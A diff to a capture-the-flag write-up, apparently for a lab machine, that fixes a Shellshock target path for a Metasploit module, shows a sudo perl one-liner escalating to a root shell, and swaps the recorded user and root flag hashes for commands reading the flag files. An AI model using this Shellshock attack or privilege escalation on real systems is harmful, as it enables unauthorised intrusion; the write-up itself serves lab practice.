@@ -46,7 +46,7 @@ comments: []
 ### Using MetaSploit
 
 - multi/http/apache_mod_cgi_bash_env_exec
-- TARGETURI : /cgi-bin/useer.sh
+- TARGETURI : /cgi-bin/user.sh
 
 ### Manual exploitation 
 
@@ -57,10 +57,8 @@ lhost=10.10.14.36 lport=4444 pages=/cgi-bin/user.sh
 
 ## User Flag
 
-### Location : /home/shelly/user.txt
-
 ```
-2ec24e11320026d1e70ff3e16695b233
+cat /home/shell/user.txt
 ```
 
 ## Priv Esc
@@ -71,10 +69,9 @@ sudo /usr/bin/perl -e 'system("/bin/bash")'
 
 ## Root Flag
 
-Location : /root/root.txt
  
 ```
-52c2715605d70c7619030560dc1ca467
+cat /root/root.txt
 ```
 <!-- Matomo -->
 <script type="text/javascript">
